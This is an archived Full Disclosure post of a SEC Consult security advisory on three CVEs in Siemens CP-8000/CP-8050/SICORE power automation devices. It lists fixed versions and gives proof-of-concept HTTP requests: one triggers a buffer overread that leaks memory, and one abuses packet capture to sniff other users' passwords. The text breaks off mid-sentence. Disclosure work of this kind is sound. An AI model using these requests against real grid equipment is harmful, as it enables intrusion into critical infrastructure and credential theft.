---
title: SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products
url: https://seclists.org/fulldisclosure/2024/Jul/4
source: Full Disclosure
date: 2024-07-05
fetch_date: 2025-10-06T17:51:34.485694
---

# SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 26 Jun 2024 09:01:43 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20240626-0 >
=======================================================================
              title: Multiple Vulnerabilities in Power Automation Products
            product: Siemens CP-8000/CP-8021/CP8-022/CP-8031/CP-8050/SICORE
 vulnerable version: CPC80 < V16.41 / CPCI85 < V5.30 / OPUPI0 < V5.30 / SICORE < V1.3.0 /
                     CPCX26 < V06.02 for CP-2016 and PCCX26 < V06.05 for CP-2019 in SICAM AK3 /
                     ETA4 < V10.46 and ETA5 < V03.27 for SM-2558 ins SICAM AK3, SICAM BC and SICAM TM
      fixed version: CPC80 V16.41 / CPCI85 V5.30 / OPUPI V5.30 / SICORE V1.3.0 / CPCX26 V06.02 /
                     PCCX26 V06.05 / ETA4 V10.46 / ETA5 V03.27
         CVE number: CVE-2024-31484, CVE-2024-31485, CVE-2024-31486
             impact: high
           homepage: https://www.siemens.com/global/en/products/energy/energy-automation-and-smart-grid.html
              found: 2023-04-03 and 2024-01-12
                 by: Stefan Viehboeck (Office Vienna)
                     Steffen Robertz (Office Vienna)
                     Gerhard Hechenberger (Office Vienna)
                     Constantin Schieber-Knoebl (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."

Source: https://new.siemens.com/global/en/company/about.html

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Buffer Overread (Only CP-8000/CP-8021/CP-8022/CP-8031/CP-8050/CPCX26/PCCX26/ETA4/ETA5, CVE-2024-31484)
The webserver running on the CP-8050 and CP-8031 is vulnerable to a buffer overread
vulnerability.

The value of the HTTP header "Session-ID" is processed and used in a "strncpy" call
without proper termination. Thus, data structures from the BSS segment will be
leaked in the response. Attackers might be able to read sensitive data from memory.

2) Privilege Escalation (Only CP-8031/CP-8050 and SICORE devices, CVE-2024-31485)
An attacker with an account with the viewer (or higher) role can intercept unencrypted
traffic of other users of the web interface. Thus, the attacker can intercept higher
privileged user accounts and passwords and might gain access to their accounts to
perform tasks with elevated privileges.

3) Unsafe Storage of MQTT Client Passwords (Only CP-8031/CP-8050, CVE-2024-31486)
A PLC with the OPUPI0 MQTT application installed is able to connect to
an MQTT server. The configured MQTT password for the server is stored
in cleartext on the device and can be read by exploiting a potential
code execution or file disclosure vulnerability or with physical access
to the device.

Proof of concept:
-----------------
1) Buffer Overread (Only CP-8000/CP-8021/CP-8022/CP-8031/CP-8050/CPCX26/PCCX26/ETA4/ETA5, CVE-2024-31484)
The buffer overread can be triggered by sending a "Session-ID" in the HTTP request header
with exactly 20 bytes. This can be done with e.g. this request:

POST /SICAM_TOOLBOX_1703_remote_connection_00.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9921c6cAAAA
Sequence-ID: 1
Content-Length: 8
Content-Type: text/plain
KeepAlive: 5
Connection: close
type=3

The server answers with following response:

HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA9921c6cAAAAæk¤
Cache-Control: max-age=0, private
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubdomains
Content-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval'
X-XSS-Protection: 1; mode=block
X-Permitted-Cross-Domain-Policies: none
Content-Length: 71
Connection: close
Date: Wed, 30 Mar 2022 01:38:37 GMT

Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

The Session-ID in the response leaks at least 4 additional bytes. Further,
the structure of the response is broken, as some HTTP headers are suddenly part
of the body.

The vulnerability most likely stems from a misuse of the strncpy function.
The following code segment was analyzed (RTUM85.elf, Offset 0x1d50de):

ptr_fcgi_header = get_fcgi_param(fcgi_struct, "HTTP_SESSION_ID);
if (ptr_fcgi_header == (char*) 0x00) goto LAB_001d4a66;
if ( is_a_session_available == 0 ) {
    strncpy(&session_id, ptr_fcgi_header, 0x14);
}

strncpy is called with a length parameter of 0x14. To trigger the vulnerability,
we are sending exactly 0x14 bytes. Thus, we believe that the global session_id
variable is never properly terminated with a Null-pointer.

libc's documentation even contains a warning for this case:
"If there is no null byte among the first n bytes of src, the string
placed in dest will not be null-terminated."

Thus, if the response is built, every data structure in BSS following the
session_id global will be printed as string until a Null byte is encountered.

2) Privilege Escalation (Only CP-8031/CP-8050 and SICORE devices, CVE-2024-31485)
An attacker with an account with the viewer (or higher) role can intercept unencrypted
traffic of other users of the web interface. Thus, the attacker can intercept higher
privileged user accounts and passwords.

By starting the Ethernet Packet Capture (Home -> Monitoring & Simulation -> Ethernet
Packet Capture), a request is sent. This request can be modified by an interceptor
proxy (e.g. Burp Suite).

POST /sicweb-ajax/rtum85/cview HTTP/1.1
Host: HOST
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
SICWEB-SID: xNG1v825qFmCMo8hpjfISlVARKipW1B+lz9d5FoBxipR87VT
Content-Length: 198
Origin: http:// HOST
Connection: close
Referer: http:// HOST/

<?xml version="1.0" encoding="UTF-8"?>
<Cmd_SetCustomViewValue><view id="packet_capture"><parameter id="p0">
<value>lo</value>
</parameter></view></Cmd_SetCustomViewValue>

The attacker can then send the parameter id p0 to the value "lo" and start the
packet capture in order to dump from the loopback interface. It is a valid
interface, as it only consist of lowercase characters and numbers (fix
for CVE-2023-33919).

However, the webserver imp...